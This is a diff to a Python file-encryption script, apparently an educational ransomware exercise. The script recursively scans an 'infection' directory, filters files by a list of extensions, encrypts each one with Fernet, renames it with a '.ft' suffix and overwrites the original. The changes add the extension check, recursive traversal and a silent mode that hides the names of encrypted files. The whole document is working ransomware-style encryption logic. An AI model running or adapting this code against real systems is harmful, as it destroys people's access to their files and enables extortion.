@@ -12,35 +12,41 @@ def check_extension(file_name):
     except FileNotFoundError:
         print("File 'extensions.txt' not found.")
         sys.exit(1)
-    print(file_data)
+    extensions = file_data.splitlines()
+    if any(file_name.endswith(ext) for ext in extensions):
+        return True
+    else:
+        return False
 
 
-def encrypt_file(file_name, key):
+def encrypt_file(file_name, key, silent):
     """
     Encrypt a file given a key.
     """
-    print(f"file to encrypt: '{file_name}'")
-    check_extension(file_name)
-    sys.exit(0)
-    f = Fernet(key)
-    try:
-        with open(file_name, "rb") as file:
-            file_data = file.read()
-    except FileNotFoundError:
-        print("Error: file '{file_name}' not found.")
-        sys.exit(1)
-    encrypted_data = f.encrypt(file_data)
-    try:
-        if file_name.endswith('.ft'):
-            new_file_name = file_name
-        else:
-            new_file_name = file_name + '.ft'
-        os.rename(file_name, new_file_name)
-        with open(new_file_name, "wb") as file:
-            file.write(encrypted_data)
-    except FileNotFoundError:
-        print("Error: file '{file_name}' not found.")
-        sys.exit(1)
+    if check_extension(file_name):
+        f = Fernet(key)
+        try:
+            with open(file_name, "rb") as file:
+                file_data = file.read()
+        except FileNotFoundError:
+            print("Error: file '{file_name}' not found.")
+            sys.exit(1)
+        encrypted_data = f.encrypt(file_data)
+        try:
+            if file_name.endswith('.ft'):
+                new_file_name = file_name
+            else:
+                new_file_name = file_name + '.ft'
+            os.rename(file_name, new_file_name)
+            if silent == False:
+                print(f"Encrypting... {file_name}")
+            with open(new_file_name, "wb") as file:
+                file.write(encrypted_data)
+        except FileNotFoundError:
+            print("Error: file '{file_name}' not found.")
+            sys.exit(1)
+    else:
+        print(f"The file {file_name} does not have a matching extension.")
 
 
 
@@ -53,20 +59,18 @@ def generate_key():
         key_file.write(key)
     return key
 
-def list_dir(base_dir, key):
-    print('Listing:', base_dir)
+def list_dir(base_dir, key, silent):
     try:
         with os.scandir(base_dir) as entries:
             for entry in entries:
                 if entry.is_dir():
-                    print('Directory:', entry.name)
-                    list_dir(entry.path, key)
+                    list_dir(entry.path, key, silent)
                 else:
                     if base_dir.endswith('/'):
                         file_name = base_dir + entry.name
                     else:
                         file_name = base_dir + '/' + entry.name
-                    encrypt_file(file_name, key)
+                    encrypt_file(file_name, key, silent)
     except FileNotFoundError:
         print(f"Directory not found: '{base_dir}'")
         sys.exit(1)
@@ -94,6 +98,8 @@ if __name__ == '__main__':
             help='Run the program in silent mode without displaying the names of the encrypted files.'
     )
     args = parser.parse_args()
+    if args.silent:
+        print("Silent mode.")
     base_dir = './infection/'
     key = generate_key()
-    list_dir(base_dir, key)
+    list_dir(base_dir, key, args.silent)
